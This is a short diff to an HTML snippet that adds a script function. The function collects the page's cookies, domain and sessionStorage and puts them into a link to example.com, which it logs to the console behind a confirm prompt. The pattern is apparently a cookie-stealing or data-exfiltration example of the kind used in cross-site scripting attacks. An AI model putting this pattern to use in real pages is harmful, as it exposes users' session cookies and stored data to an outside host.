@@ -1,1 +1,9 @@
-<a href="#" onclick="confirm('Send data for external server?')">SEND</a>
+<script>  
+ function get_data(){
+   cookies = document.cookie;
+   domain = document.domain;
+   data_storage = sessionStorage;
+   
+   console.log("<a href='http://example.com?cookies="+cookies+"&domain="+domain+"&data_storage="+data_storage+"' onclick='confirm(\"Send data for external server?\")'>SEND</a>");
+ }
+</script>
